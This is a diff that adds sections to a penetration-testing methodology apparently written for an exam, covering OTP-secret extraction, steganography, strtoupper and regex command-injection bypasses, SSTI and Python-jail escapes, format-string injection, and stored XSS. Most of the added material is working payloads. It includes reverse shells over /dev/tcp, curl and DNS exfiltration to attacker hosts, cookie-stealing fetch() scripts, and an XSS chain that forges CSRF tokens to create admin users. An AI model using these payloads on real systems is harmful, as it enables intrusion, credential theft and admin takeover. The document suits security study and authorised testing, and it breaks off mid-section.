@@ -711,6 +711,151 @@ perl -MHTML::Entities -pe 'decode_entities($_)' < body.txt > decoded.txt
 
 > **When to use:** blind SQLi / XPath / NoSQL Boolean extraction where echoed chars get HTML-encoded; web-shell output wrapped in `<pre>...</pre>`; error pages that leak data with `&#xNN;` escapes; scraping API responses that return JSON inside an HTML page; LFI reads of files containing characters auto-encoded by the wrapping template.
 
+### 1.10 QR Code / Barcode Image Decoding for Hidden URLs or Secrets
+
+Web apps sometimes embed URLs, tokens, OTP seeds, or credentials inside QR codes or barcodes rendered on pages (MFA setup, ticket systems, inventory apps). Decode any QR/barcode image found during recon to extract the encoded data.
+
+```bash
+# Download the QR/barcode image from the target
+curl -s "http://<TARGET>/<APP_PATH>/qr.png" -o /tmp/qr.png
+
+# Decode with zbarimg (zbar-tools package — pre-installed on Kali)
+zbarimg --raw /tmp/qr.png
+# Output: the decoded URL/text/OTP URI (e.g. otpauth://totp/user?secret=BASE32KEY&issuer=App)
+
+# Decode multiple formats (QR, EAN, Code128, etc.)
+zbarimg -q --raw /tmp/barcode.png
+
+# Batch decode all images in a directory
+find /tmp/images/ -name "*.png" -exec zbarimg --raw {} \;
+```
+
+```python
+# Python alternative (when zbar not available but Python is)
+# Uses pyzbar + PIL (both in standard Kali Python)
+python3 -c "
+from PIL import Image
+from pyzbar.pyzbar import decode
+results = decode(Image.open('/tmp/qr.png'))
+for r in results:
+    print(f'{r.type}: {r.data.decode()}')
+"
+```
+
+```bash
+# Extract OTP secret from otpauth:// URI (common MFA bypass scenario)
+# URI format: otpauth://totp/User?secret=<BASE32_SECRET>&issuer=<APP>&digits=6&period=30
+SECRET=$(zbarimg --raw /tmp/qr.png | grep -oP 'secret=\K[A-Z2-7]+')
+echo "[+] OTP Secret: $SECRET"
+
+# Generate current TOTP code from extracted secret (oathtool)
+oathtool --totp -b "$SECRET"
+# Or with Python:
+python3 -c "
+import hmac, hashlib, struct, time, base64
+key = base64.b32decode('$SECRET')
+t = struct.pack('>Q', int(time.time()) // 30)
+h = hmac.new(key, t, hashlib.sha1).digest()
+o = h[-1] & 0x0F
+code = (struct.unpack('>I', h[o:o+4])[0] & 0x7FFFFFFF) % 1000000
+print(f'{code:06d}')
+"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# No zbar/pyzbar — use pure Python with basic QR decode (limited but works for simple QRs)
+# Alternative: screenshot the QR in browser → phone camera → manual decode
+# Or use CyberChef offline (file:// in browser) → "Parse QR Code" operation
+
+# If only CLI + Python stdlib available, use the QR as-is from the DOM:
+# Many apps embed the OTP secret in a data attribute alongside the QR image:
+curl -s "http://<TARGET>/<APP_PATH>/mfa-setup" | grep -oE 'otpauth://[^"'"'"'<]+'
+# Or extract from JavaScript variables:
+curl -s "http://<TARGET>/<APP_PATH>/mfa-setup" | grep -oE 'secret["\x27: ]+[A-Z2-7]{16,}'
+```
+
+> **Tip:** When an MFA setup page shows a QR code, the `otpauth://` URI is often also in the page source (hidden input, JS variable, or `data-*` attribute). Check source before attempting image decode.
+
+### 1.11 Image Steganography — Extract Embedded Secrets from Web-Hosted Images
+
+Web applications may host images containing hidden data (SSH keys, passwords, flags) embedded via steganography tools. When recon reveals suspicious images (unusual file sizes, hint in filename/comments, CTF-style challenges), run stego extraction.
+
+```bash
+# Step 1 — Download and basic triage
+curl -s "http://<TARGET>/<APP_PATH>/image.jpg" -o /tmp/image.jpg
+file /tmp/image.jpg                            # confirm actual format vs extension
+ls -la /tmp/image.jpg                          # unusual size for dimensions?
+
+# Step 2 — strings extraction (catches plaintext secrets appended/embedded)
+strings /tmp/image.jpg | grep -iE 'pass|key|flag|secret|ssh-rsa|BEGIN'
+strings -n 20 /tmp/image.jpg                   # longer strings only (less noise)
+
+# Step 3 — exiftool metadata (secrets in EXIF comments, artist, copyright fields)
+exiftool /tmp/image.jpg
+exiftool /tmp/image.jpg | grep -iE 'comment|description|artist|copyright|user'
+
+# Step 4 — binwalk (detect embedded files — ZIP, gzip, certificates, other images)
+binwalk /tmp/image.jpg
+binwalk -e /tmp/image.jpg                      # auto-extract embedded files to _image.jpg.extracted/
+ls _image.jpg.extracted/                        # check what was carved out
+
+# Step 5 — steghide (JPEG/BMP — password-based hiding, most common in CTF/labs)
+steghide info /tmp/image.jpg                   # shows if data is embedded (may prompt for passphrase)
+steghide extract -sf /tmp/image.jpg -p ""      # try empty passphrase first
+steghide extract -sf /tmp/image.jpg -p "<PASSWORD>"  # if passphrase is known/guessed
+
+# Step 6 — stegseek (brute-force steghide passphrase — rockyou in seconds)
+stegseek /tmp/image.jpg /usr/share/wordlists/rockyou.txt
+# Output: extracted data + passphrase used
+
+# Step 7 — zsteg (PNG/BMP — LSB steganography detection)
+zsteg /tmp/image.jpg                           # tries all common LSB channels
+zsteg -a /tmp/image.png                        # all possible bit orders/channels
+```
+
+```bash
+# Common workflow for SSH key recovery from a web-hosted image:
+curl -s "http://<TARGET>/images/avatar.jpg" -o /tmp/avatar.jpg
+stegseek /tmp/avatar.jpg /usr/share/wordlists/rockyou.txt
+# Outputs: id_rsa (SSH private key)
+chmod 600 id_rsa
+ssh -i id_rsa <USER>@<TARGET>
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Minimal toolset — strings + xxd + dd (available on any Linux)
+# Check for appended data after image EOF markers
+# JPEG ends with FF D9; anything after is appended data
+xxd /tmp/image.jpg | grep -n 'ffd9'            # find JPEG end marker
+# If data exists after the last ffd9 offset:
+OFFSET=$(python3 -c "
+import sys
+data = open('/tmp/image.jpg','rb').read()
+end = data.rfind(b'\xff\xd9')
+if end != -1 and end + 2 < len(data):
+    print(end + 2)
+    sys.exit(0)
+sys.exit(1)
+")
+[ -n "$OFFSET" ] && dd if=/tmp/image.jpg bs=1 skip=$OFFSET of=/tmp/hidden_data 2>/dev/null
+file /tmp/hidden_data                          # identify what was appended
+cat /tmp/hidden_data                           # if text
+
+# PNG appended data (after IEND chunk)
+python3 -c "
+data = open('/tmp/image.png','rb').read()
+end = data.find(b'IEND') + 8  # IEND chunk = 4 bytes type + 4 bytes CRC
+if end < len(data):
+    print(data[end:].decode(errors='replace'))
+"
+```
+
+> **Tip:** Priority order for web-hosted images: `strings` first (fastest, catches appended text), then `exiftool` (metadata fields), then `binwalk -e` (embedded archives), then `steghide`/`stegseek` (password-protected hiding). Most exam scenarios use either appended plaintext or steghide with a guessable/crackable passphrase.
+
 [↑ Back to top](#web-application-penetration-testing-methodology)
 
 ---
@@ -1367,6 +1512,136 @@ ${PATH:5:1}                    # :
 ls${PATH:5:1}-la               # ls:-la via char extraction
 ```
 
+#### 3.2.7b Bash Parameter Expansion — Uppercase Filter Bypass (strtoupper CI)
+
+When a command injection sink applies `strtoupper()` (or equivalent) before passing input to `exec()`/`system()`, all letters become uppercase and standard commands fail. Bash parameter expansion and variable slicing let you reconstruct lowercase characters entirely from environment variables that survive the case transform (their values, not names, contain lowercase).
+
+```bash
+# Scenario: PHP does strtoupper($input) before system($input)
+# All alphabetic chars are uppercased, BUT:
+# - Bash special chars (; | $ { } : / 0-9) are unaffected by strtoupper
+# - $PATH value on disk is lowercase: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+# - Offset:length slicing ${VAR:offset:length} extracts exact chars
+
+# Step 1 — confirm $PATH value and map char positions
+# (Do this from a local box matching the target OS; positions are consistent per distro)
+echo ${PATH} | cat -A    # show exact chars with positions
+# Typical: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+# Step 2 — extract individual lowercase chars via offset:length
+${PATH:0:1}    # /
+${PATH:1:1}    # u
+${PATH:2:1}    # s
+${PATH:3:1}    # r
+${PATH:5:1}    # l (from "local")
+${PATH:6:1}    # o
+${PATH:7:1}    # c
+${PATH:8:1}    # a
+${PATH:14:1}   # b (from "sbin")
+${PATH:10:1}   # s (from "sbin")
+
+# Step 3 — reconstruct a command from char slices
+# Example: build "cat /etc/passwd"
+# c=${PATH:7:1}  a=${PATH:8:1}  t=${PATH:18:1} (varies by PATH)
+# Chain them: ${PATH:7:1}${PATH:8:1}${PATH:18:1}${PATH:0:1}...
+
+# Build 'php -r' to invoke an eval shell (common CPTS pattern)
+# p=${PATH:31:1} h=${PATH:??:1} depends on PATH layout — map locally first
+```
+
+```bash
+# Alternative approach — ${PATH#pattern} and ${PATH%%pattern} trimming
+# Strip everything up to a known char:
+${PATH%%u*}              # everything BEFORE first 'u' → "/" (gets the prefix)
+tmp=${PATH#*bin}         # strip up to first "bin" → ":/usr/..." (gets the suffix)
+# Then slice the first char of the result
+
+# ${HOME} and ${PWD} also carry lowercase chars:
+${HOME:0:1}    # / (always)
+${PWD:0:1}     # /
+
+# $RANDOM produces digits; $SECONDS too — useful for numeric args
+```
+
+```bash
+# Full worked example: execute "id" when input is uppercased
+# i = ${PATH:25:1} (from /usr/sbIN on typical Debian)
+# d = ${PATH:34:1} (from /bin/ — d position varies)
+# Fallback: use printf with octal (not alphabetic) — survives uppercase
+# \151 = i, \144 = d
+$(printf "\151\144")    # executes "id" — printf + octal are non-alpha
+
+# Execute "cat /etc/passwd" via printf octal (fully non-alpha)
+$(printf "\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144")
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure LOTL — printf with octal codes needs no external tools
+# Build any command from \NNN sequences (NNN = octal of each ASCII char)
+# Helper to generate the payload from attacker box:
+python3 -c "
+cmd = 'cat /etc/passwd'
+print('$(printf \"' + ''.join(f'\\\\{oct(ord(c))[2:].zfill(3)}' for c in cmd) + '\")')
+"
+# Output: $(printf "\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144")
+# Paste the output as the injection payload — all non-alpha, survives strtoupper()
+
+# Alternative: $'\xNN' ANSI-C quoting (hex, also non-alpha)
+$'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
+```
+
+> **Tip:** Map `${PATH}` char positions on a matching distro Docker image before the exam. Debian/Ubuntu and Alpine have different default PATH values. The printf-octal approach is universal and requires zero pre-mapping.
+
+#### 3.2.7c Unanchored preg_match Regex Bypass
+
+When a PHP backend validates input with `preg_match('/^[a-zA-Z0-9]+$/', $input)` the regex is properly anchored and blocks injection. But if the regex lacks `^` and `$` anchors (e.g. `preg_match('/[a-zA-Z0-9]+/', $input)`) it only checks that the input *contains* a matching substring anywhere — the rest of the string can hold injection metacharacters. Prefix a pattern-matching value before the payload so the validator's unanchored regex matches the benign prefix and returns true.
+
+```bash
+# Vulnerable PHP pattern (simplified):
+#   if (preg_match('/[0-9]+/', $_POST['ip'])) { system("ping " . $_POST['ip']); }
+# The regex matches if input CONTAINS digits anywhere — no anchoring
+
+# Strategy: lead with a valid-looking value that satisfies the regex, then inject
+127.0.0.1; id
+127.0.0.1 && cat /etc/passwd
+127.0.0.1 | whoami
+192.168.1.1; curl http://<ATTACKER_IP>/$(id|base64)
+
+# Common unanchored patterns and their bypass shapes:
+# /[a-zA-Z]+/  → validword; id
+# /\d+/        → 123; id
+# /https?:\/\//  → http://x; id     (URL-type validator)
+# /[a-f0-9]{32}/  → <32_HEX_CHARS>; id  (hash-type validator)
+```
+
+```bash
+# Detection: submit a clearly invalid value that PARTIALLY matches
+# If preg_match('/[0-9]+/', $input):
+#   "abc" → fails (no digits) → error
+#   "1abc;id" → passes (contains "1") → command runs
+# The difference in response between "abc" and "1abc" reveals unanchored regex
+
+# Multi-line bypass (%0a) — preg_match without /s flag treats \n as line boundary
+# Even anchored /^...$/ without /m flag can be bypassed with %0a on some PHP versions
+127.0.0.1%0aid
+valid_input%0a/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure curl — test for unanchored regex by comparing responses
+# Request 1: no match at all (should fail validation)
+curl -s -X POST "http://<TARGET>/<APP_PATH>" -d "ip=!@#" -o /dev/null -w "%{http_code} %{size_download}"
+# Request 2: partial match + injection (should pass unanchored check)
+curl -s -X POST "http://<TARGET>/<APP_PATH>" -d "ip=127.0.0.1;id" -o /dev/null -w "%{http_code} %{size_download}"
+# If response 2 differs from response 1 (different size/code) → unanchored regex confirmed
+```
+
+> **Tip:** The `%0a` (newline) trick also defeats anchored `preg_match('/^...$/', $input)` when the PHP code does not use the `/D` (dollar-end-only) modifier — `$` matches before a trailing newline by default in PCRE. So `"valid\n;id"` passes `^valid$` and the shell sees two lines.
+
 #### 3.2.8 PowerShell Obfuscation
 
 ```powershell
@@ -1513,6 +1788,87 @@ ${7*7}        → 49  →  FreeMarker, Velocity, Thymeleaf (inline), Mako
 | **EJS** | Node.js | `<%= 7*7 %>` → 49 | `<%= process.mainModule.require('child_process').execSync('id') %>` |
 | **Jade/Pug** | Node.js | `#{7*7}` → 49 | `#{global.process.mainModule.require('child_process').execSync('id')}` |
 
+#### SSTI Context Variable Enumeration via Wordlist Fuzzing
+
+Before jumping to RCE chains, enumerate what template variables are already available in the render context. Many frameworks expose `config`, `request`, `session`, `user`, `settings`, `debug`, `server` objects that leak secrets or enable auth bypass without triggering RCE signatures.
+
+```bash
+# Fuzz template context variables — inject {{VAR}} and look for non-empty/non-error responses
+# Use raft-medium-words or a custom list of common framework context names
+ffuf -u "http://<TARGET>/<APP_PATH>?<PARAM>=%7B%7BFUZZ%7D%7D" \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt \
+  -fs <BASELINE_SIZE> -mc all -t 50
+
+# Targeted variable names (Jinja2/Flask, Twig/Symfony, Django common context)
+for var in config request session g app current_user user self \
+           settings DEBUG SECRET_KEY DATABASES csrf_token \
+           _self env server loop block; do
+  resp=$(curl -s "http://<TARGET>/<APP_PATH>?<PARAM>={{${var}}}")
+  echo "$resp" | grep -qvE '(error|undefined|none|null|^$)' && echo "[+] $var: $(echo $resp | head -c 200)"
+done
+```
+
+```bash
+# Jinja2/Flask — high-value context objects that leak without RCE
+{{config}}                     # Flask config dict — SECRET_KEY, DB URI, API keys
+{{config.items()}}             # Same as dict items
+{{request.environ}}            # WSGI environ — internal paths, server software
+{{request.headers}}            # All request headers
+{{session}}                    # Signed session data
+{{g}}                          # Flask globals (app-specific state)
+{{url_for.__globals__}}        # Module globals accessible via url_for
+
+# Twig/Symfony — context leak
+{{app.environment}}            # dev/prod
+{{app.debug}}                  # true/false
+{{app.request.server.all}}     # $_SERVER equivalent
+{{app.user}}                   # Current authenticated user object
+{{_context}}                   # All variables in current scope (Twig 2.x+)
+{{dump()}}                     # Twig dump() if debug enabled — dumps all context
+```
+
+```bash
+# Automated wordlist approach with Burp Intruder:
+# 1. Capture the SSTI-vulnerable request in Repeater
+# 2. Set payload position around the variable name: {{PAYLOAD}}
+# 3. Load wordlist: raft-medium-words + custom framework vars
+# 4. Filter: exclude responses matching the "undefined variable" error string
+# 5. Any response with actual data = reachable context variable
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Curl loop — no ffuf/Burp needed
+# Build a small wordlist of high-value context vars
+cat > /tmp/ssti_vars.txt <<'EOF'
+config
+request
+session
+user
+current_user
+settings
+app
+self
+g
+server
+debug
+SECRET_KEY
+DATABASE_URL
+_context
+dump
+url_for
+EOF
+
+BASELINE=$(curl -s "http://<TARGET>/<APP_PATH>?<PARAM>={{nonexistent_var_xyz}}" | wc -c)
+while read -r var; do
+  size=$(curl -s "http://<TARGET>/<APP_PATH>?<PARAM>={{${var}}}" | wc -c)
+  [ "$size" -ne "$BASELINE" ] && echo "[+] $var (size=$size vs baseline=$BASELINE)"
+done < /tmp/ssti_vars.txt
+```
+
+> **Tip:** `{{config}}` in Flask dumps `SECRET_KEY` which lets you forge `itsdangerous` session cookies (session hijack without RCE). `{{request.environ}}` leaks internal IPs, filesystem paths, and sometimes database credentials from environment variables.
+
 #### Jinja2 Deep-Dive (Most Common in CPTS)
 
 ```python
@@ -1545,6 +1901,103 @@ ${7*7}        → 49  →  FreeMarker, Velocity, Thymeleaf (inline), Mako
 # Hex encoding
 {{''['\x5f\x5fclass\x5f\x5f']}}
 ```
+
+#### 3.3b Python Sandbox / Jail Bypass (eval/exec with Keyword Denylist)
+
+Distinct from Jinja2 SSTI: this covers raw Python `eval()`/`exec()` sandboxes (pyjails) that strip keywords like `import`, `os`, `system`, `open`, `__`, `subprocess` from user input before executing. The same `__subclasses__`/`__globals__`/`__mro__` primitives apply but need keyword-filter evasion in a non-template context.
+
+```python
+# === Step 1 — Enumerate available subclasses (find gadget indices) ===
+# Even when '__' is blocked, bypass via string concat or getattr
+().__class__.__bases__[0].__subclasses__()
+# Or via getattr:
+getattr(getattr((), '__class__'), '__bases__')[0].__subclasses__()
+
+# === Step 2 — Locate useful gadget classes by index ===
+# Common targets (index varies by Python version):
+# - <class 'os._wrap_close'>        → has __init__.__globals__['system']
+# - <class 'warnings.catch_warnings'> → has __init__.__globals__
+# - <class 'subprocess.Popen'>      → direct RCE
+# - <class 'site.Quitter'>          → calls os._exit (Python 2/3)
+# - <class '_io.FileIO'>            → file read without open()
+
+# Auto-find the index:
+[x for x in ().__class__.__bases__[0].__subclasses__() if 'wrap_close' in str(x)]
+# Returns: [<class 'os._wrap_close'>] — note the index from full list
+```
+
+```python
+# === Keyword filter bypasses (when 'import', 'os', '__' are blocked) ===
+
+# String concatenation to rebuild dunder names
+''.__class__                                    # blocked if '__' banned
+getattr('', '__cla'+'ss__')                     # bypass: concat in getattr arg
+getattr('', '\x5f\x5fclass\x5f\x5f')           # hex escape for __
+
+# chr() concatenation (bypasses any string-literal filter)
+getattr(getattr('', chr(95)+chr(95)+'class'+chr(95)+chr(95)), chr(95)+chr(95)+'mro'+chr(95)+chr(95))
+
+# Attribute access via __getattribute__ on metaclasses
+type.__getattribute__(''.__class__, '__mro__')
+
+# globals() from a found class (os._wrap_close example at index X)
+().__class__.__bases__[0].__subclasses__()[<INDEX>].__init__.__globals__['system']('id')
+
+# When 'system' is also blocked as a string:
+().__class__.__bases__[0].__subclasses__()[<INDEX>].__init__.__globals__['sy'+'stem']('id')
+().__class__.__bases__[0].__subclasses__()[<INDEX>].__init__.__globals__[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)]('id')
+```
+
+```python
+# === RCE gadgets (pick based on what survives the filter) ===
+
+# Via os._wrap_close (most common pyjail gadget)
+().__class__.__bases__[0].__subclasses__()[<INDEX>].__init__.__globals__['system']('id')
+
+# Via warnings.catch_warnings → os module in globals
+[x.__init__.__globals__['system']('id') for x in ().__class__.__bases__[0].__subclasses__() if 'catch_warnings' in str(x)]
+
+# Via builtins.__import__ (when 'import' keyword is blocked but __import__ function is accessible)
+().__class__.__bases__[0].__subclasses__()[<INDEX>].__init__.__globals__['__builtins__']['__import__']('os').system('id')
+
+# Via exec/eval in builtins
+().__class__.__bases__[0].__subclasses__()[<INDEX>].__init__.__globals__['__builtins__']['exec']('import os;os.system("id")')
+
+# File read without 'open' keyword (via _io.FileIO subclass)
+[x('/etc/passwd').read() for x in ().__class__.__bases__[0].__subclasses__() if 'FileIO' in str(x)]
+
+# breakpoint() trick (Python 3.7+ — drops to pdb, then use os.system from pdb)
+breakpoint()
+# In pdb: import os; os.system('id')
+```
+
+```python
+# === Bypass when both eval input AND output are filtered ===
+
+# Use exec() to write results to a file, then read externally
+exec("import os;os.system('id > /tmp/out')")
+# Then read /tmp/out via file-read gadget or external access
+
+# OOB exfil via DNS (when no output is returned)
+exec("import os;os.system('nslookup $(id|base64).<COLLAB_DOMAIN>')")
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# When testing pyjails externally (no local Python needed for payload gen):
+# Use curl to POST payloads directly — URL-encode the Python
+
+# Step 1: find subclass index (send via vulnerable param)
+PAYLOAD="[str(x)+':'+str(i) for i,x in enumerate(().__class__.__bases__[0].__subclasses__()) if 'wrap_close' in str(x)]"
+curl -s "http://<TARGET>/<APP_PATH>?<PARAM>=$(python3 -c "import urllib.parse;print(urllib.parse.quote('''$PAYLOAD'''))")"
+
+# Step 2: exploit using discovered index
+PAYLOAD="().__class__.__bases__[0].__subclasses__()[<INDEX>].__init__.__globals__['system']('id')"
+curl -s "http://<TARGET>/<APP_PATH>?<PARAM>=$(python3 -c "import urllib.parse;print(urllib.parse.quote('''$PAYLOAD'''))")"
+```
+
+> **Tip:** Run `python3 -c "for i,c in enumerate(().__class__.__bases__[0].__subclasses__()): print(i,c)"` locally on a matching Python version to pre-map gadget indices before the exam. Common: `os._wrap_close` is ~133 on Python 3.10, ~137 on 3.11.
 
 #### Twig Deep-Dive (PHP)
 ```php
@@ -1586,6 +2039,104 @@ tplmap -u "http://<TARGET>/page?name=test"
 tplmap -u "http://<TARGET>/page?name=test" --os-shell
 tplmap -u "http://<TARGET>/page?name=test" -e jinja2 --reverse-shell <ATTACKER_IP> <PORT>
 ```
+
+### 3.3c Python str.format() Injection (Format String Attack)
+
+Distinct from SSTI: occurs when attacker-controlled input is used as the *format template* in Python's `str.format()` or `format_map()` — e.g. `user_input.format(obj=some_object)` or `template.format_map(locals())`. No Jinja2/template engine involved; pure Python string formatting exposes `__init__.__globals__` for secret exfiltration and potentially RCE.
+
+```python
+# Vulnerable code pattern:
+#   greeting = user_input.format(user=current_user)
+#   output = f"Hello {user_input}".format(config=app.config)  # less common but equivalent
+#   msg = template.format_map({'user': user_obj})
+
+# Detection — inject format specifiers and observe output
+{0}                            # positional arg → leak first format arg as string
+{user}                         # named arg → leak the 'user' object repr
+{user.__class__}               # class of the format argument
+{user.__class__.__name__}      # class name string
+```
+
+```python
+# === Secret exfiltration via __init__.__globals__ ===
+# Traverse from any object passed as a format argument to its module globals
+
+# Step 1 — identify available format arguments (try common names)
+{user}
+{config}
+{self}
+{request}
+{app}
+
+# Step 2 — traverse to globals (where SECRET_KEY, DB passwords live)
+{user.__init__.__globals__}
+{user.__class__.__init__.__globals__[SECRET_KEY]}
+{user.__class__.__init__.__globals__[config]}
+{user.__class__.__init__.__globals__[app].config}
+
+# Real-world payloads (Flask/Django patterns)
+{user.__class__.__init__.__globals__[app].secret_key}
+{user.__class__.__init__.__globals__[os].environ}
+{user.__class__.__init__.__globals__[__builtins__][open](/etc/passwd).read()}
+
+# Accessing nested attributes
+{user.__class__.__mro__[1].__subclasses__()}
+{user.__class__.__init__.__globals__[sys].modules[os].environ}
+```
+
+```bash
+# curl-based testing against a web endpoint
+# URL-encode the payload (curly braces need encoding in some contexts)
+curl -s "http://<TARGET>/<APP_PATH>?<PARAM>=%7Buser.__class__.__init__.__globals__%7D"
+
+# POST variant
+curl -s -X POST "http://<TARGET>/<APP_PATH>" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "template={user.__init__.__globals__[SECRET_KEY]}"
+
+# JSON body (when format_map is used on deserialized JSON values)
+curl -s -X POST "http://<TARGET>/<APP_PATH>" \
+  -H "Content-Type: application/json" \
+  -d '{"greeting": "{user.__init__.__globals__}"}'
+```
+
+```python
+# format_map variant — app passes locals() or a dict to format_map
+# If any local variable is an object with interesting globals:
+{self.__init__.__globals__[os].popen(id).read()}
+# Note: .popen().read() often fails in format strings (no method chaining)
+# Exfiltration is the primary impact; RCE requires a code-execution gadget in globals
+```
+
+```bash
+# Difference from SSTI:
+# - SSTI: {{7*7}} resolves → template engine active
+# - format injection: {7*7} does NOT resolve (not math eval)
+# - format injection: {0.__class__} DOES resolve → str.format() is the sink
+# Test: submit {7*7} — if output is literally "{7*7}" or errors, not "49", it's not SSTI
+#       submit {0.__class__} — if output is "<class 'str'>" → format string injection
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Enumerate accessible objects without any tools
+# Step 1: confirm format injection
+curl -s "http://<TARGET>/<APP_PATH>?<PARAM>={0.__class__}"
+# If response contains "<class 'str'>" or similar → confirmed
+
+# Step 2: traverse globals from named args
+for attr in __class__ __init__ __globals__; do
+  echo "Testing: {user.${attr}}"
+  curl -s "http://<TARGET>/<APP_PATH>?<PARAM>={user.${attr}}" | head -c 500
+  echo
+done
+
+# Step 3: extract secrets
+curl -s "http://<TARGET>/<APP_PATH>?<PARAM>={user.__init__.__globals__[SECRET_KEY]}"
+```
+
+> **Tip:** Unlike SSTI, format string injection cannot execute arbitrary Python expressions (no `{{os.popen('id').read()}}`). Impact is primarily **information disclosure** (SECRET_KEY, database credentials, API tokens from module globals). However, if the leaked SECRET_KEY is used for session signing (Flask `itsdangerous`), forge a session cookie for admin access — this converts info-leak to full compromise.
 
 ### 3.4 Cross-Site Scripting (XSS)
 
@@ -1796,6 +2347,170 @@ Payload triggers when an admin/support agent views the attacker's input (e.g. su
 interactsh-client -v
 # Payload: <script>fetch('http://<INTERACTSH_URL>/?c='+document.cookie)</script>
 ```
+
+#### 3.4.6b Stored XSS via HTTP Request Headers (Referer / User-Agent / X-Forwarded-For)
+
+Apps that log HTTP request headers and render them in admin dashboards, log viewers, or analytics pages create a stored XSS vector. The attacker injects XSS payloads INTO request headers during normal browsing; when an admin views the logs, the payload fires in their browser context.
+
+```bash
+# Inject XSS into User-Agent — logged by most web servers and displayed in admin panels
+curl -s "http://<TARGET>/" \
+  -A '<script>fetch("http://<ATTACKER_IP>/xss?c="+document.cookie)</script>'
+
+# Inject into Referer header — analytics dashboards often render referring URLs
+curl -s "http://<TARGET>/" \
+  -H 'Referer: <script>fetch("http://<ATTACKER_IP>/xss?c="+document.cookie)</script>'
+
+# Inject into X-Forwarded-For — load balancer logs, IP-display panels
+curl -s "http://<TARGET>/" \
+  -H 'X-Forwarded-For: <script>fetch("http://<ATTACKER_IP>/xss?c="+document.cookie)</script>'
+
+# Inject into multiple headers simultaneously (shotgun approach)
+curl -s "http://<TARGET>/<APP_PATH>" \
+  -A '"><img src=x onerror=fetch("http://<ATTACKER_IP>/ua?c="+document.cookie)>' \
+  -H 'Referer: "><img src=x onerror=fetch("http://<ATTACKER_IP>/ref?c="+document.cookie)>' \
+  -H 'X-Forwarded-For: "><img src=x onerror=fetch("http://<ATTACKER_IP>/xff?c="+document.cookie)>' \
+  -H 'X-Real-IP: <script>new Image().src="http://<ATTACKER_IP>/xri?c="+document.cookie</script>' \
+  -H 'True-Client-IP: <script>new Image().src="http://<ATTACKER_IP>/tci?c="+document.cookie</script>'
+```
+
+```bash
+# Trigger multiple requests to increase chance of admin viewing the log entry
+for i in $(seq 1 10); do
+  curl -s "http://<TARGET>/$(cat /dev/urandom | tr -dc 'a-z' | head -c 8)" \
+    -A '<script src=http://<ATTACKER_IP>/xss.js></script>' &
+done
+wait
+```
+
+```bash
+# Common sinks where header-injected XSS fires:
+# - /admin/logs, /admin/access-log, /dashboard/visitors
+# - /analytics, /stats, /reports
+# - Server-status pages rendering client info
+# - Ticket/support systems that include request metadata
+# - WAF/IDS dashboards showing blocked requests
+
+# Attacker listener (captures admin cookie when log page is viewed)
+python3 -m http.server 80
+# Or use the dedicated capture script from 3.4.3
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure curl + nc — no external tools
+# Start listener
+nc -nlvp 80 &
+
+# Send poisoned request headers
+curl -s "http://<TARGET>/" \
+  -A '"><img src=x onerror="new Image().src=`http://<ATTACKER_IP>/?c=${document.cookie}`">' \
+  -H 'Referer: javascript:void' \
+  -o /dev/null
+
+# Wait for admin to view logs — nc catches the GET with cookie
+```
+
+> **Tip:** If the log viewer HTML-encodes `<>` but renders inside an attribute context (e.g. `<td title="USER_AGENT">`), use attribute-breaking payloads: `" onfocus=alert(1) autofocus="` or `" onmouseover=fetch('http://<ATTACKER_IP>/?c='+document.cookie) "`.
+
+#### 3.4.6c Stored/Blind XSS Chained to Authenticated Admin Action (CSRF-Token Forging)
+
+When XSS fires in an admin's browser, the attacker's JS runs with the admin's session and can read CSRF tokens from the DOM, then forge authenticated requests to perform privileged actions (create users, change settings, promote roles). This chain turns a stored/blind XSS into full admin account takeover without needing the session cookie directly.
+
+```javascript
+// xss_chain.js — hosted on attacker server, loaded via stored/blind XSS
+// Chain: XSS fires in admin context → read CSRF token → forge admin action
+
+(async function(){
+  // Step 1: Fetch the admin page that contains the CSRF token
+  let resp = await fetch('/admin/users/create', {credentials: 'include'});
+  let html = await resp.text();
+
+  // Step 2: Extract CSRF token from the page (adapt selector to target app)
+  let parser = new DOMParser();
+  let doc = parser.parseFromString(html, 'text/html');
+  let csrf = doc.querySelector('input[name="csrf_token"]')?.value
+           || doc.querySelector('meta[name="csrf-token"]')?.content
+           || doc.querySelector('input[name="_token"]')?.value;
+
+  // Step 3: Forge admin action — create a new admin user
+  let formData = new URLSearchParams();
+  formData.append('csrf_token', csrf);
+  formData.append('username', '<USER>');
+  formData.append('password', '<PASSWORD>');
+  formData.append('role', 'admin');
+  formData.append('email', 'attacker@evil.com');
+
+  let result = await fetch('/admin/users/create', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: formData.toString()
+  });
+
+  // Step 4: Exfil confirmation to attacker
+  fetch('http://<ATTACKER_IP>/done?status=' + result.status + '&csrf=' + csrf);
+})();
+```
+
+```html
+<!-- Injection payload that loads the chain script -->
+<script src=http://<ATTACKER_IP>/xss_chain.js></script>
+
+<!-- Inline variant (no external hosting needed — fits in one payload) -->
+<script>
+fetch('/admin/settings').then(r=>r.text()).then(h=>{
+  let t=h.match(/name="csrf_token" value="([^"]+)"/)[1];
+  fetch('/admin/settings',{method:'POST',credentials:'include',
+    headers:{'Content-Type':'application/x-www-form-urlencoded'},
+    body:'csrf_token='+t+'&allow_registration=1&default_role=admin'
+  }).then(r=>fetch('http://<ATTACKER_IP>/ok?s='+r.status));
+});
+</script>
+```
+
+```javascript
+// XMLHttpRequest variant (works in older browsers / tighter CSP)
